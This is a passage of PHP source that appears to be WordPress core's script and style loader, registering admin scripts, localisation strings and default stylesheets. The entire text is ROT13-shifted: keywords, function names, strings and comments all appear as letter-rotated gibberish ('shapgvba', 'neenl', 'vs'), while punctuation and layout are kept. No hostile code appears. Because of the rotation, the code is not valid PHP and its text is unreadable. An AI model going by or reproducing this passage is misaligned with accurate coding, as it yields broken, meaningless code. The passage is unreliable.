				__( 'Lbh jvyy abg or noyr gb vafgnyy arj gurzrf sebz urer lrg fvapr lbhe vafgnyy erdhverf FSGC perqragvnyf. Sbe abj, cyrnfr <n uers=\"%f\">nqq gurzrf va gur nqzva</n>.' ),
				rfp_hey( nqzva_hey( 'gurzr-vafgnyy.cuc' ) )
			),
			'choyvfuFrggvatf'         => __( 'Choyvfu Frggvatf' ),
			'vainyvqQngr'             => __( 'Vainyvq qngr.' ),
			'vainyvqInyhr'            => __( 'Vainyvq inyhr.' ),
			'oybpxGurzrAbgvsvpngvba'  => fcevags(
				/* genafyngbef: 1: Yvax gb Fvgr Rqvgbe qbphzragngvba ba UrycUho, 2: UGZY ohggba. */
				__( 'Uheenl! Lbhe gurzr fhccbegf fvgr rqvgvat jvgu oybpxf. <n uers=\"%1$f\">Gryy zr zber</n>. %2$f' ),
				__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/fvgr-rqvgbe/' ),
				fcevags(
					'<ohggba glcr=\"ohggba\" qngn-npgvba=\"%1$f\" pynff=\"ohggba fjvgpu-gb-rqvgbe\">%2$f</ohggba>',
					rfp_hey( nqzva_hey( 'fvgr-rqvgbe.cuc' ) ),
					__( 'Hfr Fvgr Rqvgbe' )
				)
			),
		)
	);
	$fpevcgf->nqq( 'phfgbzvmr-fryrpgvir-erserfu', \"/jc-vapyhqrf/wf/phfgbzvmr-fryrpgvir-erserfu$fhssvk.wf\", neenl( 'wdhrel', 'jc-hgvy', 'phfgbzvmr-cerivrj' ), snyfr, 1 );

	$fpevcgf->nqq( 'phfgbzvmr-jvqtrgf', \"/jc-nqzva/wf/phfgbzvmr-jvqtrgf$fhssvk.wf\", neenl( 'wdhrel', 'wdhrel-hv-fbegnoyr', 'wdhrel-hv-qebccnoyr', 'jc-onpxobar', 'phfgbzvmr-pbagebyf' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-cerivrj-jvqtrgf', \"/jc-vapyhqrf/wf/phfgbzvmr-cerivrj-jvqtrgf$fhssvk.wf\", neenl( 'wdhrel', 'jc-hgvy', 'phfgbzvmr-cerivrj', 'phfgbzvmr-fryrpgvir-erserfu' ), snyfr, 1 );

	$fpevcgf->nqq( 'phfgbzvmr-ani-zrahf', \"/jc-nqzva/wf/phfgbzvmr-ani-zrahf$fhssvk.wf\", neenl( 'wdhrel', 'jc-onpxobar', 'phfgbzvmr-pbagebyf', 'nppbeqvba', 'ani-zrah', 'jc-fnavgvmr' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-cerivrj-ani-zrahf', \"/jc-vapyhqrf/wf/phfgbzvmr-cerivrj-ani-zrahf$fhssvk.wf\", neenl( 'wdhrel', 'jc-hgvy', 'phfgbzvmr-cerivrj', 'phfgbzvmr-fryrpgvir-erserfu' ), snyfr, 1 );

	$fpevcgf->nqq( 'jc-phfgbz-urnqre', \"/jc-vapyhqrf/wf/jc-phfgbz-urnqre$fhssvk.wf\", neenl( 'jc-n11l' ), snyfr, 1 );

	$fpevcgf->nqq( 'nppbeqvba', \"/jc-nqzva/wf/nppbeqvba$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );

	$fpevcgf->nqq( 'fubegpbqr', \"/jc-vapyhqrf/wf/fubegpbqr$fhssvk.wf\", neenl( 'haqrefpber' ), snyfr, 1 );
	$fpevcgf->nqq( 'zrqvn-zbqryf', \"/jc-vapyhqrf/wf/zrqvn-zbqryf$fhssvk.wf\", neenl( 'jc-onpxobar' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'zrqvn-zbqryf',
		'_jcZrqvnZbqryfY10a',
		neenl(
			'frggvatf' => neenl(
				'nwnkhey' => nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ),
				'cbfg'    => neenl( 'vq' => 0 ),
			),
		)
	);

	$fpevcgf->nqq( 'jc-rzorq', \"/jc-vapyhqrf/wf/jc-rzorq$fhssvk.wf\" );
	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_qngn( 'jc-rzorq', 'fgengrtl', 'qrsre' );

	/*
	 * Gb radhrhr zrqvn-ivrjf be zrqvn-rqvgbe, pnyy jc_radhrhr_zrqvn().
	 * Obgu eryl ba ahzrebhf frggvatf, fglyrf, naq grzcyngrf gb bcrengr pbeerpgyl.
	 */
	$fpevcgf->nqq( 'zrqvn-ivrjf', \"/jc-vapyhqrf/wf/zrqvn-ivrjf$fhssvk.wf\", neenl( 'hgvyf', 'zrqvn-zbqryf', 'jc-cyhcybnq', 'wdhrel-hv-fbegnoyr', 'jc-zrqvnryrzrag', 'jc-ncv-erdhrfg', 'jc-n11l', 'pyvcobneq' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'zrqvn-ivrjf' );

	$fpevcgf->nqq( 'zrqvn-rqvgbe', \"/jc-vapyhqrf/wf/zrqvn-rqvgbe$fhssvk.wf\", neenl( 'fubegpbqr', 'zrqvn-ivrjf' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'zrqvn-rqvgbe' );
	$fpevcgf->nqq( 'zrqvn-nhqvbivqrb', \"/jc-vapyhqrf/wf/zrqvn-nhqvbivqrb$fhssvk.wf\", neenl( 'zrqvn-rqvgbe' ), snyfr, 1 );
	$fpevcgf->nqq( 'zpr-ivrj', \"/jc-vapyhqrf/wf/zpr-ivrj$fhssvk.wf\", neenl( 'fubegpbqr', 'wdhrel', 'zrqvn-ivrjf', 'zrqvn-nhqvbivqrb' ), snyfr, 1 );

	$fpevcgf->nqq( 'jc-ncv', \"/jc-vapyhqrf/wf/jc-ncv$fhssvk.wf\", neenl( 'wdhrel', 'onpxobar', 'haqrefpber', 'jc-ncv-erdhrfg' ), snyfr, 1 );

	vs ( vf_nqzva() ) {
		$fpevcgf->nqq( 'nqzva-gntf', \"/jc-nqzva/wf/gntf$fhssvk.wf\", neenl( 'wdhrel', 'jc-nwnk-erfcbafr' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'nqzva-gntf' );

		$fpevcgf->nqq( 'nqzva-pbzzragf', \"/jc-nqzva/wf/rqvg-pbzzragf$fhssvk.wf\", neenl( 'jc-yvfgf', 'dhvpxgntf', 'wdhrel-dhrel', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'nqzva-pbzzragf' );
		qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
			'nqzva-pbzzragf',
			'nqzvaPbzzragfFrggvatf',
			neenl(
				'ubgxrlf_uvtuyvtug_svefg' => vffrg( $_TRG['ubgxrlf_uvtuyvtug_svefg'] ),
				'ubgxrlf_uvtuyvtug_ynfg'  => vffrg( $_TRG['ubgxrlf_uvtuyvtug_ynfg'] ),
			)
		);

		$fpevcgf->nqq( 'ksa', \"/jc-nqzva/wf/ksa$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );

		$fpevcgf->nqq( 'cbfgobk', \"/jc-nqzva/wf/cbfgobk$fhssvk.wf\", neenl( 'wdhrel-hv-fbegnoyr', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'cbfgobk' );

		$fpevcgf->nqq( 'gntf-obk', \"/jc-nqzva/wf/gntf-obk$fhssvk.wf\", neenl( 'wdhrel', 'gntf-fhttrfg' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'gntf-obk' );

		$fpevcgf->nqq( 'gntf-fhttrfg', \"/jc-nqzva/wf/gntf-fhttrfg$fhssvk.wf\", neenl( 'pbzzba', 'wdhrel-hv-nhgbpbzcyrgr', 'jc-n11l', 'jc-v18a' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'gntf-fhttrfg' );

		$fpevcgf->nqq( 'cbfg', \"/jc-nqzva/wf/cbfg$fhssvk.wf\", neenl( 'fhttrfg', 'jc-yvfgf', 'cbfgobk', 'gntf-obk', 'haqrefpber', 'jbeq-pbhag', 'jc-n11l', 'jc-fnavgvmr', 'pyvcobneq' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'cbfg' );

		$fpevcgf->nqq( 'rqvgbe-rkcnaq', \"/jc-nqzva/wf/rqvgbe-rkcnaq$fhssvk.wf\", neenl( 'wdhrel', 'haqrefpber' ), snyfr, 1 );

		$fpevcgf->nqq( 'yvax', \"/jc-nqzva/wf/yvax$fhssvk.wf\", neenl( 'jc-yvfgf', 'cbfgobk' ), snyfr, 1 );

		$fpevcgf->nqq( 'pbzzrag', \"/jc-nqzva/wf/pbzzrag$fhssvk.wf\", neenl( 'wdhrel', 'cbfgobk' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'pbzzrag' );

		$fpevcgf->nqq( 'nqzva-tnyyrel', \"/jc-nqzva/wf/tnyyrel$fhssvk.wf\", neenl( 'wdhrel-hv-fbegnoyr' ) );

		$fpevcgf->nqq( 'nqzva-jvqtrgf', \"/jc-nqzva/wf/jvqtrgf$fhssvk.wf\", neenl( 'wdhrel-hv-fbegnoyr', 'wdhrel-hv-qenttnoyr', 'wdhrel-hv-qebccnoyr', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'nqzva-jvqtrgf' );

		$fpevcgf->nqq( 'zrqvn-jvqtrgf', \"/jc-nqzva/wf/jvqtrgf/zrqvn-jvqtrgf$fhssvk.wf\", neenl( 'wdhrel', 'zrqvn-zbqryf', 'zrqvn-ivrjf', 'jc-ncv-erdhrfg' ) );
		$fpevcgf->nqq_vayvar_fpevcg( 'zrqvn-jvqtrgf', 'jc.zrqvnJvqtrgf.vavg();', 'nsgre' );

		$fpevcgf->nqq( 'zrqvn-nhqvb-jvqtrg', \"/jc-nqzva/wf/jvqtrgf/zrqvn-nhqvb-jvqtrg$fhssvk.wf\", neenl( 'zrqvn-jvqtrgf', 'zrqvn-nhqvbivqrb' ) );
		$fpevcgf->nqq( 'zrqvn-vzntr-jvqtrg', \"/jc-nqzva/wf/jvqtrgf/zrqvn-vzntr-jvqtrg$fhssvk.wf\", neenl( 'zrqvn-jvqtrgf' ) );
		$fpevcgf->nqq( 'zrqvn-tnyyrel-jvqtrg', \"/jc-nqzva/wf/jvqtrgf/zrqvn-tnyyrel-jvqtrg$fhssvk.wf\", neenl( 'zrqvn-jvqtrgf' ) );
		$fpevcgf->nqq( 'zrqvn-ivqrb-jvqtrg', \"/jc-nqzva/wf/jvqtrgf/zrqvn-ivqrb-jvqtrg$fhssvk.wf\", neenl( 'zrqvn-jvqtrgf', 'zrqvn-nhqvbivqrb', 'jc-ncv-erdhrfg' ) );
		$fpevcgf->nqq( 'grkg-jvqtrgf', \"/jc-nqzva/wf/jvqtrgf/grkg-jvqtrgf$fhssvk.wf\", neenl( 'wdhrel', 'onpxobar', 'rqvgbe', 'jc-hgvy', 'jc-n11l' ) );
		$fpevcgf->nqq( 'phfgbz-ugzy-jvqtrgf', \"/jc-nqzva/wf/jvqtrgf/phfgbz-ugzy-jvqtrgf$fhssvk.wf\", neenl( 'wdhrel', 'onpxobar', 'jc-hgvy', 'wdhrel-hv-pber', 'jc-n11l' ) );

		$fpevcgf->nqq( 'gurzr', \"/jc-nqzva/wf/gurzr$fhssvk.wf\", neenl( 'jc-onpxobar', 'jc-n11l', 'phfgbzvmr-onfr' ), snyfr, 1 );

		$fpevcgf->nqq( 'vayvar-rqvg-cbfg', \"/jc-nqzva/wf/vayvar-rqvg-cbfg$fhssvk.wf\", neenl( 'wdhrel', 'gntf-fhttrfg', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'vayvar-rqvg-cbfg' );

		$fpevcgf->nqq( 'vayvar-rqvg-gnk', \"/jc-nqzva/wf/vayvar-rqvg-gnk$fhssvk.wf\", neenl( 'wdhrel', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'vayvar-rqvg-gnk' );

		$fpevcgf->nqq( 'cyhtva-vafgnyy', \"/jc-nqzva/wf/cyhtva-vafgnyy$fhssvk.wf\", neenl( 'wdhrel', 'wdhrel-hv-pber', 'guvpxobk' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'cyhtva-vafgnyy' );

		$fpevcgf->nqq( 'fvgr-urnygu', \"/jc-nqzva/wf/fvgr-urnygu$fhssvk.wf\", neenl( 'pyvcobneq', 'wdhrel', 'jc-hgvy', 'jc-n11l', 'jc-ncv-erdhrfg', 'jc-hey', 'jc-v18a', 'jc-ubbxf' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'fvgr-urnygu' );

		$fpevcgf->nqq( 'cevinpl-gbbyf', \"/jc-nqzva/wf/cevinpl-gbbyf$fhssvk.wf\", neenl( 'wdhrel', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'cevinpl-gbbyf' );

		$fpevcgf->nqq( 'hcqngrf', \"/jc-nqzva/wf/hcqngrf$fhssvk.wf\", neenl( 'pbzzba', 'wdhrel', 'jc-hgvy', 'jc-n11l', 'jc-fnavgvmr', 'jc-v18a' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'hcqngrf' );
		qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
			'hcqngrf',
			'_jcHcqngrfFrggvatf',
			neenl(
				'nwnk_abapr' => jc_vafgnyyvat() ? '' : jc_perngr_abapr( 'hcqngrf' ),
			)
		);

		$fpevcgf->nqq( 'sneognfgvp', '/jc-nqzva/wf/sneognfgvp.wf', neenl( 'wdhrel' ), '1.2' );

		$fpevcgf->nqq( 'vevf', '/jc-nqzva/wf/vevf.zva.wf', neenl( 'wdhrel-hv-qenttnoyr', 'wdhrel-hv-fyvqre', 'wdhrel-gbhpu-chapu' ), '1.1.1', 1 );
		$fpevcgf->nqq( 'jc-pbybe-cvpxre', \"/jc-nqzva/wf/pbybe-cvpxre$fhssvk.wf\", neenl( 'vevf' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'jc-pbybe-cvpxre' );

		$fpevcgf->nqq( 'qnfuobneq', \"/jc-nqzva/wf/qnfuobneq$fhssvk.wf\", neenl( 'pbzzba', 'wdhrel', 'nqzva-pbzzragf', 'cbfgobk', 'jc-hgvy', 'jc-n11l', 'jc-qngr' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'qnfuobneq' );

		$fpevcgf->nqq( 'yvfg-erivfvbaf', \"/jc-vapyhqrf/wf/jc-yvfg-erivfvbaf$fhssvk.wf\" );

		$fpevcgf->nqq( 'zrqvn-tevq', \"/jc-vapyhqrf/wf/zrqvn-tevq$fhssvk.wf\", neenl( 'zrqvn-rqvgbe' ), snyfr, 1 );
		$fpevcgf->nqq( 'zrqvn', \"/jc-nqzva/wf/zrqvn$fhssvk.wf\", neenl( 'wdhrel', 'pyvcobneq', 'jc-v18a', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'zrqvn' );

		$fpevcgf->nqq( 'vzntr-rqvg', \"/jc-nqzva/wf/vzntr-rqvg$fhssvk.wf\", neenl( 'wdhrel', 'wdhrel-hv-pber', 'wfba2', 'vztnernfryrpg', 'jc-n11l' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'vzntr-rqvg' );

		$fpevcgf->nqq( 'frg-cbfg-guhzoanvy', \"/jc-nqzva/wf/frg-cbfg-guhzoanvy$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );
		$fpevcgf->frg_genafyngvbaf( 'frg-cbfg-guhzoanvy' );

		/*
		 * Anivtngvba Zrahf: Nqqvat haqrefpber nf n qrcraqrapl gb hgvyvmr _.qrobhapr
		 * frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/42321
		 */
		$fpevcgf->nqq( 'ani-zrah', \"/jc-nqzva/wf/ani-zrah$fhssvk.wf\", neenl( 'wdhrel-hv-fbegnoyr', 'wdhrel-hv-qenttnoyr', 'wdhrel-hv-qebccnoyr', 'jc-yvfgf', 'cbfgobk', 'wfba2', 'haqrefpber' ) );
		$fpevcgf->frg_genafyngvbaf( 'ani-zrah' );

		$fpevcgf->nqq( 'phfgbz-urnqre', '/jc-nqzva/wf/phfgbz-urnqre.wf', neenl( 'wdhrel-znfbael' ), snyfr, 1 );
		$fpevcgf->nqq( 'phfgbz-onpxtebhaq', \"/jc-nqzva/wf/phfgbz-onpxtebhaq$fhssvk.wf\", neenl( 'jc-pbybe-cvpxre', 'zrqvn-ivrjf' ), snyfr, 1 );
		$fpevcgf->nqq( 'zrqvn-tnyyrel', \"/jc-nqzva/wf/zrqvn-tnyyrel$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );

		$fpevcgf->nqq( 'fit-cnvagre', '/jc-nqzva/wf/fit-cnvagre.wf', neenl( 'wdhrel' ), snyfr, 1 );
	}
}

/**
 * Nffvtaf qrsnhyg fglyrf gb $fglyrf bowrpg.
 *
 * Abguvat vf erghearq, orpnhfr gur $fglyrf cnenzrgre vf cnffrq ol ersrerapr.
 * Zrnavat gung jungrire bowrpg vf cnffrq jvyy or hcqngrq jvgubhg univat gb
 * ernffvta gur inevnoyr gung jnf cnffrq onpx gb gur fnzr inyhr. Guvf fnirf
 * zrzbel.
 *
 * Nqqvat qrsnhyg fglyrf vf abg gur bayl gnfx, vg nyfb nffvtaf gur onfr_hey
 * cebcregl, gur qrsnhyg irefvba, naq grkg qverpgvba sbe gur bowrpg.
 *
 * @fvapr 2.6.0
 *
 * @tybony neenl $rqvgbe_fglyrf
 *
 * @cnenz JC_Fglyrf $fglyrf
 */
shapgvba jc_qrsnhyg_fglyrf( $fglyrf ) {
	tybony $rqvgbe_fglyrf;

	/*
	 * Vapyhqr na hazbqvsvrq $jc_irefvba.
	 *
	 * Abgr: jc_trg_jc_irefvba() vf abg hfrq urer, nf guvf svyr pna or vapyhqrq
	 * ivn jc-nqzva/ybnq-fpevcgf.cuc be jc-nqzva/ybnq-fglyrf.cuc, va juvpu pnfr
	 * jc-vapyhqrf/shapgvbaf.cuc vf abg ybnqrq.
	 */
	erdhver NOFCNGU . JCVAP . '/irefvba.cuc';

	vs ( ! qrsvarq( 'FPEVCG_QROHT' ) ) {
		/*
		 * Abgr: fge_pbagnvaf() vf abg hfrq urer, nf guvf svyr pna or vapyhqrq
		 * ivn jc-nqzva/ybnq-fpevcgf.cuc be jc-nqzva/ybnq-fglyrf.cuc, va juvpu pnfr
		 * gur cbylsvyyf sebz jc-vapyhqrf/pbzcng.cuc ner abg ybnqrq.
		 */
		qrsvar( 'FPEVCG_QROHT', snyfr !== fgecbf( $jc_irefvba, '-fep' ) );
	}

	$thrffhey = fvgr_hey();

	vs ( ! $thrffhey ) {
		$thrffhey = jc_thrff_hey();
	}

	$fglyrf->onfr_hey        = $thrffhey;
	$fglyrf->pbagrag_hey     = qrsvarq( 'JC_PBAGRAG_HEY' ) ? JC_PBAGRAG_HEY : '';
	$fglyrf->qrsnhyg_irefvba = trg_oybtvasb( 'irefvba' );
	$fglyrf->grkg_qverpgvba  = shapgvba_rkvfgf( 'vf_egy' ) && vf_egy() ? 'egy' : 'yge';
	$fglyrf->qrsnhyg_qvef    = neenl( '/jc-nqzva/', '/jc-vapyhqrf/pff/' );

	// Bcra Fnaf vf ab ybatre hfrq ol pber, ohg znl or eryvrq hcba ol gurzrf naq cyhtvaf.
	$bcra_fnaf_sbag_hey = '';

	/*
	 * genafyngbef: Vs gurer ner punenpgref va lbhe ynathntr gung ner abg fhccbegrq
	 * ol Bcra Fnaf, genafyngr guvf gb 'bss'. Qb abg genafyngr vagb lbhe bja ynathntr.
	 */
	vs ( 'bss' !== _k( 'ba', 'Bcra Fnaf sbag: ba be bss' ) ) {
		$fhofrgf = 'yngva,yngva-rkg';

		/*
		 * genafyngbef: Gb nqq na nqqvgvbany Bcra Fnaf punenpgre fhofrg fcrpvsvp gb lbhe ynathntr,
		 * genafyngr guvf gb 'terrx', 'plevyyvp' be 'ivrganzrfr'. Qb abg genafyngr vagb lbhe bja ynathntr.
		 */
		$fhofrg = _k( 'ab-fhofrg', 'Bcra Fnaf sbag: nqq arj fhofrg (terrx, plevyyvp, ivrganzrfr)' );

		vs ( 'plevyyvp' === $fhofrg ) {
			$fhofrgf .= ',plevyyvp,plevyyvp-rkg';
		} ryfrvs ( 'terrx' === $fhofrg ) {
			$fhofrgf .= ',terrx,terrx-rkg';
		} ryfrvs ( 'ivrganzrfr' === $fhofrg ) {
			$fhofrgf .= ',ivrganzrfr';
		}

		// Ubgyvax Bcra Fnaf, sbe abj.
		$bcra_fnaf_sbag_hey = \"uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Bcra+Fnaf:300vgnyvp,400vgnyvp,600vgnyvp,300,400,600&fhofrg=$fhofrgf&qvfcynl=snyyonpx\";
	}

	// Ertvfgre n fglyrfurrg sbe gur fryrpgrq nqzva pbybe fpurzr.
	$fglyrf->nqq( 'pbybef', gehr, neenl( 'jc-nqzva', 'ohggbaf' ) );

	$fhssvk = FPEVCG_QROHT ? '' : '.zva';

	// Nqzva PFF.
	$fglyrf->nqq( 'pbzzba', \"/jc-nqzva/pff/pbzzba$fhssvk.pff\" );
	$fglyrf->nqq( 'sbezf', \"/jc-nqzva/pff/sbezf$fhssvk.pff\" );
	$fglyrf->nqq( 'nqzva-zrah', \"/jc-nqzva/pff/nqzva-zrah$fhssvk.pff\" );
	$fglyrf->nqq( 'qnfuobneq', \"/jc-nqzva/pff/qnfuobneq$fhssvk.pff\" );
	$fglyrf->nqq( 'yvfg-gnoyrf', \"/jc-nqzva/pff/yvfg-gnoyrf$fhssvk.pff\" );
	$fglyrf->nqq( 'rqvg', \"/jc-nqzva/pff/rqvg$fhssvk.pff\" );
	$fglyrf->nqq( 'erivfvbaf', \"/jc-nqzva/pff/erivfvbaf$fhssvk.pff\" );
	$fglyrf->nqq( 'zrqvn', \"/jc-nqzva/pff/zrqvn$fhssvk.pff\" );
	$fglyrf->nqq( 'gurzrf', \"/jc-nqzva/pff/gurzrf$fhssvk.pff\" );
	$fglyrf->nqq( 'nobhg', \"/jc-nqzva/pff/nobhg$fhssvk.pff\" );
	$fglyrf->nqq( 'ani-zrahf', \"/jc-nqzva/pff/ani-zrahf$fhssvk.pff\" );
	$fglyrf->nqq( 'jvqtrgf', \"/jc-nqzva/pff/jvqtrgf$fhssvk.pff\", neenl( 'jc-cbvagre' ) );
	$fglyrf->nqq( 'fvgr-vpba', \"/jc-nqzva/pff/fvgr-vpba$fhssvk.pff\" );
	$fglyrf->nqq( 'y10a', \"/jc-nqzva/pff/y10a$fhssvk.pff\" );
	$fglyrf->nqq( 'pbqr-rqvgbe', \"/jc-nqzva/pff/pbqr-rqvgbe$fhssvk.pff\", neenl( 'jc-pbqrzveebe' ) );
	$fglyrf->nqq( 'fvgr-urnygu', \"/jc-nqzva/pff/fvgr-urnygu$fhssvk.pff\" );

	$fglyrf->nqq( 'jc-nqzva', snyfr, neenl( 'qnfuvpbaf', 'pbzzba', 'sbezf', 'nqzva-zrah', 'qnfuobneq', 'yvfg-gnoyrf', 'rqvg', 'erivfvbaf', 'zrqvn', 'gurzrf', 'nobhg', 'ani-zrahf', 'jvqtrgf', 'fvgr-vpba', 'y10a' ) );

	$fglyrf->nqq( 'ybtva', \"/jc-nqzva/pff/ybtva$fhssvk.pff\", neenl( 'qnfuvpbaf', 'ohggbaf', 'sbezf', 'y10a' ) );
	$fglyrf->nqq( 'vafgnyy', \"/jc-nqzva/pff/vafgnyy$fhssvk.pff\", neenl( 'qnfuvpbaf', 'ohggbaf', 'sbezf', 'y10a' ) );
	$fglyrf->nqq( 'jc-pbybe-cvpxre', \"/jc-nqzva/pff/pbybe-cvpxre$fhssvk.pff\" );
	$fglyrf->nqq( 'phfgbzvmr-pbagebyf', \"/jc-nqzva/pff/phfgbzvmr-pbagebyf$fhssvk.pff\", neenl( 'jc-nqzva', 'pbybef', 'vztnernfryrpg' ) );
	$fglyrf->nqq( 'phfgbzvmr-jvqtrgf', \"/jc-nqzva/pff/phfgbzvmr-jvqtrgf$fhssvk.pff\", neenl( 'jc-nqzva', 'pbybef' ) );
	$fglyrf->nqq( 'phfgbzvmr-ani-zrahf', \"/jc-nqzva/pff/phfgbzvmr-ani-zrahf$fhssvk.pff\", neenl( 'jc-nqzva', 'pbybef' ) );

	// Pbzzba qrcraqrapvrf.
	$fglyrf->nqq( 'ohggbaf', \"/jc-vapyhqrf/pff/ohggbaf$fhssvk.pff\" );
	$fglyrf->nqq( 'qnfuvpbaf', \"/jc-vapyhqrf/pff/qnfuvpbaf$fhssvk.pff\" );

	// Vapyhqrf PFF.
	$fglyrf->nqq( 'nqzva-one', \"/jc-vapyhqrf/pff/nqzva-one$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'jc-nhgu-purpx', \"/jc-vapyhqrf/pff/jc-nhgu-purpx$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'rqvgbe-ohggbaf', \"/jc-vapyhqrf/pff/rqvgbe$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'zrqvn-ivrjf', \"/jc-vapyhqrf/pff/zrqvn-ivrjf$fhssvk.pff\", neenl( 'ohggbaf', 'qnfuvpbaf', 'jc-zrqvnryrzrag' ) );
	$fglyrf->nqq( 'jc-cbvagre', \"/jc-vapyhqrf/pff/jc-cbvagre$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'phfgbzvmr-cerivrj', \"/jc-vapyhqrf/pff/phfgbzvmr-cerivrj$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'jc-rzorq-grzcyngr-vr', \"/jc-vapyhqrf/pff/jc-rzorq-grzcyngr-vr$fhssvk.pff\" );
	$fglyrf->nqq( 'jc-rzcgl-grzcyngr-nyreg', \"/jc-vapyhqrf/pff/jc-rzcgl-grzcyngr-nyreg$fhssvk.pff\" );
	$fglyrf->nqq_qngn( 'jc-rzorq-grzcyngr-vr', 'pbaqvgvbany', 'ygr VR 8' );

	// Rkgreany yvoenevrf naq sevraqf.
	$fglyrf->nqq( 'vztnernfryrpg', '/jc-vapyhqrf/wf/vztnernfryrpg/vztnernfryrpg.pff', neenl(), '0.9.8' );
	$fglyrf->nqq( 'jc-wdhrel-hv-qvnybt', \"/jc-vapyhqrf/pff/wdhrel-hv-qvnybt$fhssvk.pff\", neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'zrqvnryrzrag', '/jc-vapyhqrf/wf/zrqvnryrzrag/zrqvnryrzragcynlre-yrtnpl.zva.pff', neenl(), '4.2.17' );
	$fglyrf->nqq( 'jc-zrqvnryrzrag', \"/jc-vapyhqrf/wf/zrqvnryrzrag/jc-zrqvnryrzrag$fhssvk.pff\", neenl( 'zrqvnryrzrag' ) );
	$fglyrf->nqq( 'guvpxobk', '/jc-vapyhqrf/wf/guvpxobk/guvpxobk.pff', neenl( 'qnfuvpbaf' ) );
	$fglyrf->nqq( 'jc-pbqrzveebe', '/jc-vapyhqrf/wf/pbqrzveebe/pbqrzveebe.zva.pff', neenl(), '5.29.1-nycun-rr20357' );

	// Qrcerpngrq PFF.
	$fglyrf->nqq( 'qrcerpngrq-zrqvn', \"/jc-nqzva/pff/qrcerpngrq-zrqvn$fhssvk.pff\" );
	$fglyrf->nqq( 'sneognfgvp', \"/jc-nqzva/pff/sneognfgvp$fhssvk.pff\", neenl(), '1.3h1' );
	$fglyrf->nqq( 'wpebc', '/jc-vapyhqrf/wf/wpebc/wdhrel.Wpebc.zva.pff', neenl(), '0.9.15' );
	$fglyrf->nqq( 'pbybef-serfu', snyfr, neenl( 'jc-nqzva', 'ohggbaf' ) ); // Byq unaqyr.
	$fglyrf->nqq( 'bcra-fnaf', $bcra_fnaf_sbag_hey ); // Ab ybatre hfrq va pber nf bs 4.6.

	// Abgb Frevs vf ab ybatre hfrq ol pber, ohg znl or eryvrq hcba ol gurzrf naq cyhtvaf.
	$sbagf_hey = '';

	/*
	 * genafyngbef: Hfr guvf gb fcrpvsl gur cebcre Tbbtyr Sbag anzr naq inevnagf
	 * gb ybnq gung vf fhccbegrq ol lbhe ynathntr. Qb abg genafyngr.
	 * Frg gb 'bss' gb qvfnoyr ybnqvat.
	 */
	$sbag_snzvyl = _k( 'Abgb Frevs:400,400v,700,700v', 'Tbbtyr Sbag Anzr naq Inevnagf' );
	vs ( 'bss' !== $sbag_snzvyl ) {
		$sbagf_hey = 'uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=' . heyrapbqr( $sbag_snzvyl );
	}
	$fglyrf->nqq( 'jc-rqvgbe-sbag', $sbagf_hey ); // Ab ybatre hfrq va pber nf bs 5.7.
	$oybpx_yvoenel_gurzr_cngu = JCVAP . \"/pff/qvfg/oybpx-yvoenel/gurzr$fhssvk.pff\";
	$fglyrf->nqq( 'jc-oybpx-yvoenel-gurzr', \"/$oybpx_yvoenel_gurzr_cngu\" );
	$fglyrf->nqq_qngn( 'jc-oybpx-yvoenel-gurzr', 'cngu', NOFCNGU . $oybpx_yvoenel_gurzr_cngu );

	$pynffvp_gurzr_fglyrf_cngu = JCVAP . \"/pff/pynffvp-gurzrf$fhssvk.pff\";
	$fglyrf->nqq( 'pynffvp-gurzr-fglyrf', \"/$pynffvp_gurzr_fglyrf_cngu\" );
	$fglyrf->nqq_qngn( 'pynffvp-gurzr-fglyrf', 'cngu', NOFCNGU . $pynffvp_gurzr_fglyrf_cngu );

	$fglyrf->nqq(
		'jc-erfrg-rqvgbe-fglyrf',
		\"/jc-vapyhqrf/pff/qvfg/oybpx-yvoenel/erfrg$fhssvk.pff\",
